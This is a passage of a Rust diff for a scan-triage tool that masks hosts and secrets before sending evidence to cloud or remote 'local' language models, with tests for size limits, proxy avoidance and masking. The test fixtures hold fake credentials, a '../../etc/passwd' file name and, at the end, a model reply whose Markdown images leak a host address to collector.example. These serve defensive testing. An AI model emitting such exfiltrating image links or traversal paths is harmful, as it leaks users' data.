+            let detail = read_error(&mut response).await;
             let message = serde_json::from_str::<Value>(&detail)
                 .ok()
                 .and_then(|v| {
@@ -708,6 +1247,14 @@ impl AiEngine {
             );
         }
 
+        if let Some(len) = response.content_length() {
+            if len > MAX_ANSWER_BYTES as u64 {
+                bail!(
+                    "the reply is larger than the {} MB meow reads",
+                    MAX_ANSWER_BYTES / (1024 * 1024)
+                );
+            }
+        }
         let streamed = response
             .headers()
             .get(reqwest::header::CONTENT_TYPE)
@@ -716,10 +1263,9 @@ impl AiEngine {
         let mut text = String::new();
         let mut usage = Usage::default();
         if !streamed {
-            let reply: Value = response
-                .json()
-                .await
-                .context("the model server sent invalid JSON")?;
+            let reply: Value =
+                serde_json::from_slice(&read_bounded(&mut response, MAX_ANSWER_BYTES).await?)
+                    .context("the model server sent invalid JSON")?;
             if let Some(message) = reply.pointer("/error/message").and_then(Value::as_str) {
                 bail!("the model server reported: {}", sanitize(message, 300));
             }
@@ -728,6 +1274,7 @@ impl AiEngine {
                 .and_then(Value::as_str)
                 .unwrap_or_default()
                 .to_owned();
+            cut(&mut text, MAX_REPLY);
             on_delta(&text);
             if let Some(found) = reply.get("usage") {
                 usage = parse_usage(found);
@@ -735,13 +1282,12 @@ impl AiEngine {
             return Ok((text, usage));
         }
 
-        let mut buffer: Vec<u8> = Vec::new();
+        let mut truncated = false;
+        let mut lines = StreamLines::default();
         'stream: while let Some(chunk) = response.chunk().await.context("the reply was cut off")? {
-            buffer.extend_from_slice(&chunk);
-            while let Some(end) = buffer.iter().position(|b| *b == b'\n') {
-                let line: Vec<u8> = buffer.drain(..=end).collect();
-                let line = String::from_utf8_lossy(&line);
-                let Some(data) = line.trim().strip_prefix("data:") else {
+            lines.push(&chunk)?;
+            while let Some(line) = lines.next_line()? {
+                let Some(data) = line.strip_prefix("data:") else {
                     continue; // comments and keep-alives
                 };
                 let data = data.trim();
@@ -758,9 +1304,14 @@ impl AiEngine {
                     .pointer("/choices/0/delta/content")
                     .and_then(Value::as_str)
                 {
-                    if text.len() + piece.len() <= MAX_REPLY {
-                        text.push_str(piece);
-                        on_delta(piece);
+                    if !truncated {
+                        let added = append_bounded_utf8(&mut text, piece, MAX_REPLY);
+                        if !added.is_empty() {
+                            on_delta(added);
+                        }
+                        if added.len() < piece.len() {
+                            truncated = true;
+                        }
                     }
                 }
                 if let Some(found) = event.get("usage").filter(|u| u.is_object()) {
@@ -771,27 +1322,61 @@ impl AiEngine {
         Ok((text, usage))
     }
 
+    /// The local tier sends the evidence unmasked, which is only right
+    /// while it stays on this machine and with this user. A "local" server
+    /// on another host, or one another login user runs on this host, gets
+    /// the same masked text a cloud would.
     async fn run_local(
         &self,
         requested: Tier,
+        graph: &Graph,
+        vault: &Mutex<Vault>,
         prompt: &Prompt,
         fallback_reason: Option<String>,
         on_text: &mut (dyn FnMut(&str) + Send),
     ) -> Result<Outcome> {
+        let settings = self.settings.effective();
+        let masked_because = if !is_loopback_url(&settings.local_url) {
+            Some("the server is not on this machine".to_owned())
+        } else {
+            another_users_server(&settings.local_url)
+                .map(|uid| format!("the server belongs to another user, uid {uid}"))
+        };
+        let (user, mut unmasker) = match &masked_because {
+            Some(_) => {
+                let (masked, unmasker) = mask_prompt(vault, graph, prompt, settings.cloud_notes)?;
+                (masked, Some(unmasker))
+            }
+            None => (prompt.user.to_string(), None),
+        };
         let mut body = json!({
             "messages": [
                 { "role": "system", "content": prompt.system },
-                { "role": "user", "content": prompt.user.to_string() },
+                { "role": "user", "content": user },
             ],
             "stream": true,
             "temperature": 0.2,
         });
-        let settings = self.settings.effective();
         if !settings.local_model.is_empty() {
             body["model"] = json!(settings.local_model);
         }
+        let mut shown = String::new();
         let (text, usage) = self
-            .chat(&settings.local_url, None, &body, |piece| on_text(piece))
+            .chat(
+                &settings.local_url,
+                None,
+                &body,
+                |piece| match &mut unmasker {
+                    Some(unmasker) => {
+                        let ready = unmasker.push(piece);
+                        if !ready.is_empty() {
+                            on_text(&ready);
+                            shown.push_str(&ready);
+                        }
+                    }
+                    None => on_text(piece),
+                },
+            )
             .await
             .with_context(|| match &fallback_reason {
                 // Say why the cloud was not used, or the real cause is lost.
@@ -801,10 +1386,27 @@ impl AiEngine {
                 ),
                 None => "local tier [L] failed (is a model server running?)".to_owned(),
             })?;
-        let model = if settings.local_model.is_empty() {
+        let text = match unmasker {
+            Some(mut unmasker) => {
+                let rest = unmasker.finish();
+                if !rest.is_empty() {
+                    on_text(&rest);
+                    shown.push_str(&rest);
+                }
+                shown
+            }
+            None => text,
+        };
+        let clean_local = sanitize(&settings.local_model, 120);
+        let model = if clean_local.is_empty() {
             "local"
         } else {
-            &settings.local_model
+            clean_local.as_str()
+        };
+        // Shown with the answer, so the user knows what the server saw.
+        let named = match &masked_because {
+            Some(why) => format!("{model} (masked: {why})"),
+            None => model.to_owned(),
         };
         record_usage(
             &lock_db(&self.db),
@@ -818,7 +1420,7 @@ impl AiEngine {
         Ok(Outcome {
             requested,
             tier: Tier::Local,
-            model: model.to_owned(),
+            model: named,
             text,
             cost_usd: 0.0,
             web_search_requests: 0,
@@ -843,7 +1445,9 @@ impl AiEngine {
             _ => triage_prompt(graph, host),
         };
         if tier == Tier::Local {
-            return self.run_local(tier, &prompt, None, on_text).await;
+            return self
+                .run_local(tier, graph, vault, &prompt, None, on_text)
+                .await;
         }
 
         let unavailable = |reason: &str| -> Result<Option<String>> {
@@ -858,28 +1462,17 @@ impl AiEngine {
             let reason = unavailable(
                 "no cloud API key yet (run `meow setup` to add yours, or to choose a local model)",
             )?;
-            return self.run_local(tier, &prompt, reason, on_text).await;
+            return self
+                .run_local(tier, graph, vault, &prompt, reason, on_text)
+                .await;
         };
 
         // Mask, then prove nothing private is left before going on.
-        let (masked_user, mut unmasker) = {
-            let mut vault = vault.lock().unwrap_or_else(|p| p.into_inner());
-            vault.register_graph(graph);
-            vault.register_operator();
-            let masked = vault.mask_json(&prompt.user).to_string();
-            let leaks = vault.leaks(&masked);
-            if !leaks.is_empty() {
-                bail!(
-                    "refusing to send: the masked request still contains private values ({})",
-                    leaks.join(", ")
-                );
-            }
-            (masked, vault.stream())
-        };
+        let (masked_user, mut unmasker) = mask_prompt(vault, graph, &prompt, settings.cloud_notes)?;
 
         let model = match tier {
-            Tier::Research => settings.research_model.clone(),
-            _ => settings.cloud_model.clone(),
+            Tier::Research => sanitize(&settings.research_model, 120),
+            _ => sanitize(&settings.cloud_model, 120),
         };
         let key = cache_key(tier, &model, &prompt.system, &masked_user);
         let cached: Option<String> = lock_db(&self.db)
@@ -912,7 +1505,9 @@ impl AiEngine {
                 "daily cloud budget reached (${:.4} of ${:.2}, {} of {} calls)",
                 budget.spent_usd, budget.max_usd, budget.calls, budget.max_calls
             ))?;
-            return self.run_local(tier, &prompt, reason, on_text).await;
+            return self
+                .run_local(tier, graph, vault, &prompt, reason, on_text)
+                .await;
         }
 
         let mut shown = String::new();
@@ -923,12 +1518,13 @@ impl AiEngine {
                 shown.push_str(&ready);
             }
         };
+        let mut failed_spend = Usage::default();
         // (masked reply, what it cost, the model that answered)
         let result: Result<(String, Usage, String)> = match settings.provider() {
             // A Claude API key: the Claude API's own protocol, the user's
             // fallback chain, and Claude's own web search for research.
-            CloudProvider::Anthropic => anthropic::ask(
-                &self.http,
+            CloudProvider::Anthropic => anthropic::ask_with_spend(
+                self.client(&settings.cloud_url),
                 &settings.cloud_url,
                 &api_key,
                 &model,
@@ -937,6 +1533,7 @@ impl AiEngine {
                 &prompt.system,
                 &masked_user,
                 &mut deliver,
+                &mut failed_spend,
             )
             .await
             .map(|answer| (answer.text, answer.usage, answer.model)),
@@ -965,8 +1562,8 @@ impl AiEngine {
         let (masked_reply, usage, answered_by) = match result {
             Ok(done) => done,
             Err(error) => {
-                // The attempt still counts against the call cap.
-                let _ = record_usage(&lock_db(&self.db), tier, &model, &Usage::default());
+                // The attempt (including any declined fallback attempts) still counts against the budget.
+                let _ = record_usage(&lock_db(&self.db), tier, &model, &failed_spend);
                 return Err(error.context(format!("[{}] request failed", tier.key())));
             }
         };
@@ -976,11 +1573,19 @@ impl AiEngine {
 
         {
             let db = lock_db(&self.db);
-            record_usage(&db, tier, &answered_by, &usage)?;
-            db.conn().execute(
+            let tx = db.conn().unchecked_transaction()?;
+            record_usage_conn(&tx, tier, &answered_by, &usage)?;
+            tx.execute(
                 "INSERT OR REPLACE INTO prompt_cache (sha256, tier, response, created_utc) VALUES (?1, ?2, ?3, ?4)",
                 params![key, tier.as_str(), masked_reply, now_rfc3339()],
             )?;
+            tx.execute(
+                "DELETE FROM prompt_cache WHERE sha256 NOT IN (
+                    SELECT sha256 FROM prompt_cache ORDER BY created_utc DESC, sha256 DESC LIMIT ?1
+                 )",
+                params![MAX_PROMPT_CACHE_ROWS],
+            )?;
+            tx.commit()?;
         }
         Ok(Outcome {
             requested: tier,
@@ -999,9 +1604,38 @@ impl AiEngine {
 // chats/<host>.md
 // ---------------------------------------------------------------------------
 
-fn chat_file_name(address: &str) -> String {
+fn is_windows_reserved_stem(stem: &str) -> bool {
+    matches!(
+        stem.to_ascii_uppercase().as_str(),
+        "CON"
+            | "PRN"
+            | "AUX"
+            | "NUL"
+            | "COM1"
+            | "COM2"
+            | "COM3"
+            | "COM4"
+            | "COM5"
+            | "COM6"
+            | "COM7"
+            | "COM8"
+            | "COM9"
+            | "LPT1"
+            | "LPT2"
+            | "LPT3"
+            | "LPT4"
+            | "LPT5"
+            | "LPT6"
+            | "LPT7"
+            | "LPT8"
+            | "LPT9"
+    )
+}
+
+pub fn chat_file_name(address: &str) -> String {
     let safe: String = address
         .chars()
+        .take(180)
         .map(|c| {
             if c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_') {
                 c
@@ -1010,12 +1644,22 @@ fn chat_file_name(address: &str) -> String {
             }
         })
         .collect();
-    format!("{}.md", safe.trim_matches('.'))
+    let trimmed = safe.trim_matches('.');
+    if trimmed.is_empty() {
+        return "_host.md".to_owned();
+    }
+    let first_label = trimmed.split('.').next().unwrap_or("");
+    if is_windows_reserved_stem(first_label) {
+        format!("_{trimmed}.md")
+    } else {
+        format!("{trimmed}.md")
+    }
 }
 
 /// Appends a reply to the host's local Markdown file (unmasked, `0600`).
 pub fn append_chat(chats_dir: &Path, host: &Host, outcome: &Outcome) -> Result<PathBuf> {
     let path = chats_dir.join(chat_file_name(&host.address));
+    refuse_file_symlink(&path)?;
     let is_new = !path.exists();
     let mut file = private_open_options()
         .append(true)
@@ -1024,23 +1668,30 @@ pub fn append_chat(chats_dir: &Path, host: &Host, outcome: &Outcome) -> Result<P
         .with_context(|| format!("cannot open {}", path.display()))?;
     let mut entry = String::new();
     if is_new {
-        entry.push_str(&format!("# Triage notes for {}\n\n", host.label()));
+        entry.push_str(&format!(
+            "# Triage notes for {}\n\n",
+            sanitize(&host.label(), 200)
+        ));
     }
     entry.push_str(&format!(
         "## {} · [{}] {} · {}\n\n",
         now_rfc3339(),
         outcome.tier.key(),
         outcome.tier.label(),
-        outcome.model
+        crate::evidence::inert_markdown(&sanitize(&outcome.model, 200))
     ));
     if let Some(reason) = &outcome.fallback_reason {
         entry.push_str(&format!(
-            "_[{}] was requested; answered locally because: {reason}._\n\n",
-            outcome.requested.key()
+            "_[{}] was requested; answered locally because: {}._\n\n",
+            outcome.requested.key(),
+            sanitize(reason, 300)
         ));
     }
-    // Model output is untrusted too: keep it as plain text lines.
-    entry.push_str(&sanitize_block(&outcome.text, MAX_REPLY));
+    // Model output is untrusted too: it is kept as Markdown that formats
+    // and does nothing else (no image, link or HTML of its making).
+    let mut reply = outcome.text.clone();
+    cut(&mut reply, MAX_REPLY);
+    entry.push_str(crate::evidence::inert_markdown(&reply).trim());
     entry.push_str("\n\n");
     let searches = match outcome.web_search_requests {
         0 => String::new(),
@@ -1059,15 +1710,6 @@ pub fn append_chat(chats_dir: &Path, host: &Host, outcome: &Outcome) -> Result<P
     file.write_all(entry.as_bytes())
         .with_context(|| format!("cannot write {}", path.display()))?;
     Ok(path)
-}
-
-/// A missing key is the usual reason the cloud tiers are unavailable; this
-/// gives helpers a way to say so up front.
-pub fn cloud_ready(settings: &AiSettings) -> Result<()> {
-    settings
-        .api_key()
-        .map(|_| ())
-        .ok_or_else(|| anyhow!("no cloud API key yet: run `meow setup`"))
 }
 
 #[cfg(test)]
@@ -1149,6 +1791,55 @@ mod tests {
             },
         );
         graph
+    }
+
+    #[test]
+    fn a_host_with_a_thousand_ports_and_names_makes_a_bounded_request() {
+        let mut graph = Graph::default();
+        for port in 1..=1000u16 {
+            graph.apply(Observation::Port {
+                address: "10.10.10.9".into(),
+                port,
+                protocol: "tcp".into(),
+                state: if port == 999 { "open" } else { "filtered" }.into(),
+                service: None,
+                product: None,
+                version: None,
+                extra_info: None,
+                cpes: (0..20).map(|n| format!("cpe:2.3:a:v:p{n}:1.0")).collect(),
+                record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+            });
+        }
+        for name in 0..100 {
+            graph.apply(Observation::TlsSan {
+                address: "10.10.10.9".into(),
+                port: 999,
+                san: format!("n{name}.tarpit.example"),
+                record: EvidenceRecord::observed(Source::TlsSan, Confidence::High, "x"),
+            });
+        }
+        let host = &graph.hosts["10.10.10.9"];
+        let data = &triage_prompt(&graph, host).user["untrusted_scan_data"];
+        let ports = data["ports"].as_array().unwrap();
+        assert_eq!(ports.len(), MAX_PORTS);
+        assert_eq!(data["ports_left_out"], 1000 - MAX_PORTS);
+        // The open port is among those kept, with a bounded list of names.
+        assert_eq!(ports[0]["port"], "999/tcp");
+        assert_eq!(
+            ports[0]["tls_names"].as_array().unwrap().len(),
+            MAX_NAMES_PER_PORT
+        );
+        assert_eq!(ports[0]["tls_names_left_out"], 100 - MAX_NAMES_PER_PORT);
+        assert_eq!(
+            ports[0]["cpes"].as_array().unwrap().len(),
+            MAX_CPES_PER_PORT
+        );
+        assert!(data.to_string().len() < 200_000);
+        // Masking it is quick, however many names the graph registered.
+        let vault = Mutex::new(Vault::ephemeral());
+        let started = std::time::Instant::now();
+        mask_prompt(&vault, &graph, &triage_prompt(&graph, host), false).unwrap();
+        assert!(started.elapsed() < Duration::from_secs(10));
     }
 
     #[test]
@@ -1477,10 +2168,10 @@ mod tests {
         let user: Value =
             serde_json::from_str(body["messages"][1]["content"].as_str().unwrap()).unwrap();
         assert_eq!(user["untrusted_scan_data"]["address"], "<<HOST_01>>");
-        assert!(user["untrusted_scan_data"]["operator_notes"][0]
-            .as_str()
-            .unwrap()
-            .starts_with("session token <<SEC_01>> worked for <<USER_"));
+        // The operator's note stays here; the model is told one exists.
+        assert!(user["untrusted_scan_data"].get("operator_notes").is_none());
+        assert_eq!(user["untrusted_scan_data"]["operator_notes_withheld"], 1);
+        assert!(!sent.contains("session token"), "{sent}");
         // Public identifiers are intact so the model can reason about them.
         assert!(
             sent.contains("nginx") && sent.contains("1.18.0") && sent.contains("CVE-2021-23017")
@@ -1514,6 +2205,111 @@ mod tests {
             stored.contains("<<HOST_01>>") && !stored.contains("10.10.10.5"),
             "the cache holds masked text"
         );
+    }
+
+    /// Notes holding what the 2026-11 audit saw reach a stand-in cloud.
+    fn lab_with_credential_notes() -> Graph {
+        let mut graph = lab();
+        for text in [
+            "DB_PASSWORD=Sup3rS3cret!x MYSQL_ROOT_PASSWORD=r00tpw99 SMTP_PASS=mailpw77",
+            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+            "tried admin/admin123 and backup:Winter2026!",
+            "passphrase: correcthorse99 and PHPSESSID=9f2c1a77b1d04e2aa3c1",
+            "lm hash aad3b435b51404eeaad3b435b51404ee",
+        ] {
+            graph.apply(Observation::Note {
+                address: Some("10.10.10.5".into()),
+                text: text.into(),
+                record: EvidenceRecord::observed(Source::ManualNote, Confidence::Medium, "x"),
+            });
+        }
+        // Names the graph knows from nowhere else, as scripts report them.
+        graph.apply(Observation::Script {
+            address: "10.10.10.5".into(),
+            port: Some(445),
+            protocol: "tcp".into(),
+            id: "smb-os-discovery".into(),
+            output: "Computer name: filesrv01 Domain name: ad.victim-corp.com \
+                     FQDN: FILESRV01.ad.victim-corp.com; logged in as jsmith; addr:fe80::1c2d"
+                .into(),
+            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+        });
+        // The same kinds of text as a scanned server sends them.
+        graph.apply(Observation::Script {
+            address: "10.10.10.5".into(),
+            port: Some(443),
+            protocol: "tcp".into(),
+            id: "http-config-backup".into(),
+            output: "APP_SECRET=s3cr3tvalue1 API_TOKEN=tok_live_12345 \
+                     /cb?session_token=9a8b7c6d5e&reset_password_token=zz11yy22"
+                .into(),
+            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+        });
+        graph
+    }
+
+    #[tokio::test]
+    async fn notes_stay_here_and_named_secrets_never_reach_the_cloud() {
+        if !no_env_key() {
+            return;
+        }
+        const SECRETS: &[&str] = &[
+            "Sup3rS3cret!x",
+            "r00tpw99",
+            "mailpw77",
+            "wJalrXUtnFEMI",
+            "bPxRfiCYEXAMPLEKEY",
+            "correcthorse99",
+            "9f2c1a77b1d04e2aa3c1",
+            "aad3b435b51404eeaad3b435b51404ee",
+            "s3cr3tvalue1",
+            "tok_live_12345",
+            "9a8b7c6d5e",
+            "zz11yy22",
+            "filesrv01",
+            "FILESRV01",
+            "victim-corp",
+            "jsmith",
+            "fe80::1c2d",
+        ];
+        let graph = lab_with_credential_notes();
+
+        // As set up by default: no note leaves, in any form.
+        let (base, mock) = mock_models().await;
+        let (engine, _db) = engine(&base, Some("sk-or-test"));
+        let vault = Mutex::new(Vault::ephemeral());
+        run(&engine, Tier::Cloud, &graph, &vault).await.0.unwrap();
+        let sent = mock.cloud.lock().unwrap()[0].1.to_string();
+        for secret in SECRETS
+            .iter()
+            .chain(&["admin123", "Winter2026", "tried admin"])
+        {
+            assert!(!sent.contains(secret), "{secret} was sent:\n{sent}");
+        }
+        assert!(sent.contains("operator_notes_withheld"), "{sent}");
+        assert!(sent.contains("http-config-backup"), "scan data still goes");
+        // What the notes held is still on the list of what to rotate.
+        assert!(vault.lock().unwrap().exposed_secrets().len() >= 10);
+
+        // With notes switched on they go masked: every secret that has a
+        // name or a recognisable form is replaced.
+        let (base, mock) = mock_models().await;
+        let db = Arc::new(Mutex::new(Db::open_in_memory().unwrap()));
+        let settings = AiSettings {
+            cloud_url: format!("{base}/cloud"),
+            openrouter_api_key: Some("sk-or-test".into()),
+            cloud_notes: true,
+            ..AiSettings::default()
+        };
+        let engine = AiEngine::new(settings, db).unwrap();
+        let vault = Mutex::new(Vault::ephemeral());
+        run(&engine, Tier::Cloud, &graph, &vault).await.0.unwrap();
+        let sent = mock.cloud.lock().unwrap()[0].1.to_string();
+        for secret in SECRETS {
+            assert!(!sent.contains(secret), "{secret} was sent:\n{sent}");
+        }
+        assert!(sent.contains("operator_notes"), "{sent}");
+        assert!(!sent.contains("operator_notes_withheld"), "{sent}");
     }
 
     #[tokio::test]
@@ -1556,6 +2352,285 @@ mod tests {
             .unwrap();
         assert!((cost - 0.0042).abs() < 1e-12);
         assert_eq!(searches, 2);
+    }
+
+    /// Runs in a child process that has a proxy in its environment; see
+    /// the test below. Alone it does nothing.
+    #[tokio::test]
+    async fn proxy_probe_child() {
+        let Ok(name) = std::env::var("MEOW_PROXY_PROBE") else {
+            return;
+        };
+        let (base, mock) = mock_models().await;
+        // Once by address, once as "localhost".
+        let base = base.replace("127.0.0.1", &name);
+        let (engine, _db) = engine(&base, None);
+        let graph = lab();
+        let vault = Mutex::new(Vault::ephemeral());
+        let (outcome, _) = run(&engine, Tier::Local, &graph, &vault).await;
+        let outcome = outcome.unwrap();
+        assert_eq!(outcome.text, "local answer");
+        assert_eq!(mock.local.lock().unwrap().len(), 1);
+        // Unmasked, as it may be on this machine.
+        assert!(mock.local.lock().unwrap()[0]
+            .to_string()
+            .contains("10.10.10.5"));
+    }
+
+    #[test]
+    fn the_local_tier_never_goes_through_a_proxy() {
+        use std::io::{Read, Write};
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        // A stand-in for a company or system proxy: it counts what it is
+        // handed and keeps what it read.
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        let proxy = format!("http://{}", listener.local_addr().unwrap());
+        let handed = Arc::new(AtomicUsize::new(0));
+        let read = Arc::new(Mutex::new(String::new()));
+        {
+            let (handed, read) = (Arc::clone(&handed), Arc::clone(&read));
+            std::thread::spawn(move || {
+                for stream in listener.incoming() {
+                    let Ok(mut stream) = stream else { continue };
+                    handed.fetch_add(1, Ordering::SeqCst);
+                    let _ = stream.set_read_timeout(Some(Duration::from_millis(500)));
+                    let mut buffer = [0u8; 4096];
+                    if let Ok(n) = stream.read(&mut buffer) {
+                        read.lock()
+                            .unwrap()
+                            .push_str(&String::from_utf8_lossy(&buffer[..n]));
+                    }
+                    let _ =
+                        stream.write_all(b"HTTP/1.1 502 Bad Gateway\r\ncontent-length: 0\r\n\r\n");
+                }
+            });
+        }
+        for name in ["127.0.0.1", "localhost"] {
+            let output = std::process::Command::new(std::env::current_exe().unwrap())
+                .args(["--exact", "ai::tests::proxy_probe_child", "--nocapture"])
+                .env("MEOW_PROXY_PROBE", name)
+                .env("http_proxy", &proxy)
+                .env("HTTP_PROXY", &proxy)
+                .env("ALL_PROXY", &proxy)
+                .env("all_proxy", &proxy)
+                .env_remove("NO_PROXY")
+                .env_remove("no_proxy")
+                .env_remove(API_KEY_ENV)
+                .output()
+                .unwrap();
+            let said = String::from_utf8_lossy(&output.stdout);
+            assert!(
+                output.status.success() && said.contains("1 passed"),
+                "{name}: {said}\n{}\nthe proxy read: {}",
+                String::from_utf8_lossy(&output.stderr),
+                read.lock().unwrap()
+            );
+        }
+        assert_eq!(
+            handed.load(Ordering::SeqCst),
+            0,
+            "the proxy was handed: {}",
+            read.lock().unwrap()
+        );
+    }
+
+    #[tokio::test]
+    async fn an_endless_or_enormous_reply_is_an_error_not_memory() {
+        use axum::body::Body;
+        // 20 MB of JSON, 20 MB of an error page, a streamed line that never
+        // ends, and a stream of small lines that never stops.
+        let big = || "x".repeat(20 * 1024 * 1024);
+        let app = Router::new()
+            .route(
+                "/json/chat/completions",
+                post(move || async move {
+                    (
+                        [("content-type", "application/json")],
+                        format!("{{\"pad\":\"{}\"}}", big()),
+                    )
+                }),
+            )
+            .route(
+                "/error/chat/completions",
+                post(move || async move { (axum::http::StatusCode::BAD_GATEWAY, big()) }),
+            )
+            .route(
+                "/line/chat/completions",
+                post(move || async move {
+                    (
+                        [("content-type", "text/event-stream")],
+                        format!("data: {}", "y".repeat(3 * 1024 * 1024)),
+                    )
+                }),
+            )
+            .route(
+                "/stream/chat/completions",
+                post(|| async {
+                    let chunk = ": keep-alive\n".repeat(4096);
+                    let stream = futures_util::stream::repeat_with(move || {
+                        Ok::<_, std::io::Error>(chunk.clone())
+                    });
+                    (
+                        [("content-type", "text/event-stream")],
+                        Body::from_stream(stream),
+                    )
+                }),
+            );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let base = format!("http://{}", listener.local_addr().unwrap());
+        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+        let (engine, _db) = engine(&base, None);
+        let body = json!({ "messages": [] });
+        for (path, expected) in [
+            ("json", "the reply is larger than the 16 MB meow reads"),
+            ("error", "the model server answered HTTP 502"),
+            ("line", "the reply has a line longer than meow reads"),
+            ("stream", "the reply is larger than the 16 MB meow reads"),
+        ] {
+            let started = std::time::Instant::now();
+            let error = engine
+                .chat(&format!("{base}/{path}"), None, &body, |_| {})
+                .await
+                .unwrap_err();
+            let error = format!("{error:#}");
+            assert!(error.contains(expected), "{path}: {error}");
+            assert!(error.len() < 1000, "{path}: the error is short");
+            assert!(started.elapsed() < Duration::from_secs(60), "{path}");
+        }
+        // Cutting a long text never lands inside a character.
+        let mut text = "é".repeat(100_001);
+        cut(&mut text, MAX_REPLY);
+        assert_eq!(text.len(), MAX_REPLY);
+        let mut text = "aé".repeat(70_000);
+        cut(&mut text, MAX_REPLY);
+        assert_eq!(text.len(), MAX_REPLY - 1);
+        let mut lines = StreamLines::default();
+        lines.push(b"one\ntw").unwrap();
+        assert_eq!(lines.next_line().unwrap().as_deref(), Some("one"));
+        assert_eq!(lines.next_line().unwrap(), None);
+        lines.push(b"o\r\n\n").unwrap();
+        assert_eq!(lines.next_line().unwrap().as_deref(), Some("two"));
+        assert_eq!(lines.next_line().unwrap().as_deref(), Some(""));
+        assert_eq!(lines.next_line().unwrap(), None);
+    }
+
+    #[test]
+    fn a_key_in_the_environment_goes_only_to_its_own_service() {
+        let openai_style = |url: &str| AiSettings {
+            cloud_url: url.into(),
+            ..AiSettings::default()
+        };
+        assert!(openai_style("https://openrouter.ai/api/v1").env_key_applies());
+        assert!(openai_style("http://127.0.0.1:4000/v1").env_key_applies());
+        assert!(!openai_style("https://llm.other-service.example/v1").env_key_applies());
+        assert!(!openai_style("https://openrouter.ai.example/v1").env_key_applies());
+        let claude = |url: &str| AiSettings {
+            cloud_url: url.into(),
+            cloud_provider: Some(CloudProvider::Anthropic),
+            ..AiSettings::default()
+        };
+        assert!(claude("https://api.anthropic.com/v1").env_key_applies());
+        assert!(!claude("https://claude.gateway.example/v1").env_key_applies());
+        // A key from the setup file or config.toml is the user's choice
+        // for whatever service they set up.
+        let own = AiSettings {
+            openrouter_api_key: Some("their-own".into()),
+            ..openai_style("https://llm.other-service.example/v1")
+        };
+        if no_env_key() {
+            assert_eq!(own.api_key().as_deref(), Some("their-own"));
+        }
+    }
+
+    #[test]
+    fn local_means_this_machine() {
+        for (url, here) in [
+            ("http://localhost:1234/v1", true),
+            ("http://LOCALHOST:1234", true),
+            ("http://127.0.0.1:11434/v1", true),
+            ("http://127.8.9.10/v1", true),
+            ("http://[::1]:8080/v1", true),
+            ("http://192.168.1.20:1234/v1", false),
+            ("https://models.example.com/v1", false),
+            ("http://localhost.example.com/v1", false),
+            ("not a url", false),
+        ] {
+            assert_eq!(is_loopback_url(url), here, "{url}");
+        }
+        // Who listens on a port, from the kernel's table.
+        let table = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n\
+   0: 0100007F:04D2 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 12345 1 0000000000000000 100 0 0 10 0\n\
+   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2345 1 0000000000000000 100 0 0 10 0\n\
+   2: 0100007F:04D2 0100007F:C350 01 00000000:00000000 00:00000000 00000000  1000        0 3456 1 0000000000000000 20 4 30 10 -1\n\
+   3: 00000000000000000000000001000000:2CAA 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000   998        0 4567 1 0000000000000000 100 0 0 10 0\n";
+        assert_eq!(listener_uids(table, 1234), [1001]);
+        assert_eq!(listener_uids(table, 22), [0]);
+        assert_eq!(listener_uids(table, 11434), [998]);
+        assert!(listener_uids(table, 8080).is_empty());
+        assert!(listener_uids("garbage\nmore garbage", 1234).is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_local_server_on_another_machine_gets_masked_text() {
+        // An address of this machine that is not loopback stands in for
+        // another machine. Connecting a UDP socket sends nothing.
+        let Some(address) = std::net::UdpSocket::bind("0.0.0.0:0")
+            .and_then(|socket| {
+                socket.connect("192.0.2.1:9")?;
+                socket.local_addr()
+            })
+            .ok()
+            .map(|local| local.ip())
+            .filter(|ip| !ip.is_loopback() && !ip.is_unspecified())
+        else {
+            return; // no network at all on this machine
+        };
+        let seen: Arc<Mutex<Vec<Value>>> = Arc::default();
+        let app = Router::new()
+            .route(
+                "/local/chat/completions",
+                post(
+                    |State(seen): State<Arc<Mutex<Vec<Value>>>>, Json(body): Json<Value>| async move {
+                        // Answers about the first masked host it was shown.
+                        let content = body["messages"][1]["content"].as_str().unwrap_or("");
+                        let name = content
+                            .find("<<HOST_")
+                            .and_then(|at| content[at..].split(">>").next())
+                            .map(|token| format!("{token}>>"))
+                            .unwrap_or_default();
+                        seen.lock().unwrap().push(body.clone());
+                        Json(json!({ "choices": [ { "message": { "content": format!("{name} needs a patch") } } ] }))
+                    },
+                ),
+            )
+            .with_state(Arc::clone(&seen));
+        let listener = tokio::net::TcpListener::bind("0.0.0.0:0").await.unwrap();
+        let port = listener.local_addr().unwrap().port();
+        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+
+        let (engine, _) = engine(&format!("http://{address}:{port}"), None);
+        let graph = lab();
+        let vault = Mutex::new(Vault::ephemeral());
+        let (outcome, pieces) = run(&engine, Tier::Local, &graph, &vault).await;
+        let outcome = outcome.unwrap();
+        // The server saw placeholders, never the real address...
+        let sent = seen.lock().unwrap()[0]["messages"][1]["content"]
+            .as_str()
+            .unwrap()
+            .to_owned();
+        assert!(!sent.contains("10.10.10.5"), "{sent}");
+        assert!(sent.contains("<<HOST_"), "{sent}");
+        // ...and the user reads the answer with the real one back in.
+        assert_eq!(outcome.text, "10.10.10.5 needs a patch");
+        assert_eq!(pieces.concat(), "10.10.10.5 needs a patch");
+        assert_eq!(outcome.tier, Tier::Local);
+        assert!(
+            outcome
+                .model
+                .contains("masked: the server is not on this machine"),
+            "{}",
+            outcome.model
+        );
     }
 
     #[tokio::test]
@@ -1899,6 +2974,82 @@ mod tests {
         }
         assert_eq!(chat_file_name("fe80::1%eth0"), "fe80__1_eth0.md");
         assert_eq!(chat_file_name("../../etc/passwd"), "_.._etc_passwd.md");
+
+        // A reply that tries to be more than text is saved as text.
+        let hostile = Outcome {
+            model: "evil ![m](https://collector.example/m.png)".into(),
+            text: "![status](https://collector.example/p.png?v=10.10.10.5)\n\
